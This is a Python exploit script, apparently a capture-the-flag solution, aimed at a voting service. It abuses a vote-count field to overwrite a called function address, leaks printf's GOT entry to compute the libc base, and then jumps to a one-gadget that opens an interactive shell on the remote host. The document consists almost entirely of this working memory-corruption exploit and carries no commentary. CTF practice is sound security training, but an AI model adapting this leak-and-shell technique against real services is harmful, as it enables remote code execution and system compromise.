import socket, struct, os
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            print "Server disconnected"
            exit()
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            print "Server disconnected"
            exit()
        res += data
        
    return res[:-(len(s))]
    
def x(n):
    return struct.pack("<Q", n)

addr_original_action = 0x4009e0
addr_2nd_parm_printf = 0x400a00

current_call_addr = addr_original_action

def init_connection():
    sc = socket.create_connection(("fox.pwn.republican", 9000))

    sc.send("test\n")
    sc.send("test\n")
    sc.send("0\n")
    sc.send("\n")

    sc.send("test2\n")
    sc.send("test2\n")
    sc.send("0\n")
    sc.send("\n")
    
    read_until(sc, "How many votes do you want to give test2?")
    
    return sc
    
def set_new_call(sc, addr):
    global current_call_addr
    sc.send("DrumpfN\n")
    sc.send("test\n")
    sc.send(str((addr + 1 - current_call_addr)) + "\n")
    sc.send("\n")
    
    current_call_addr = addr

def do_call_param(sc, param):
    sc.send("test2\n")
    sc.send("test2\n")
    sc.send(str(param) + "\n")
    sc.send("\n")
    
def get_memory(sc, offset):
    do_call_param(sc, offset)
    read_until(sc, "How many votes do you want to give test2? ")
    res = read_until(sc, "\n[Press enter to finish voting]")
    
    return res

def get_libc_base(sc):
    libc_printf_offset = 0x115cf0
    addr_got_printf = 0x602068
    
    res = get_memory(sc, addr_got_printf)
    libc_printf = struct.unpack("<Q", res.ljust(8, "\x00"))[0]

    libc_addr = libc_printf - libc_printf_offset

    return libc_addr

sc = init_connection()

set_new_call(sc, addr_2nd_parm_printf)

libc_addr = get_libc_base(sc)

libc_puts_offset = 0x6F690
libc_binsh_gadget_offset = 0xF0567

set_new_call(sc, libc_addr + libc_binsh_gadget_offset)

do_call_param(sc, 0)

t = telnetlib.Telnet()                                                  
t.sock = sc
t.interact()
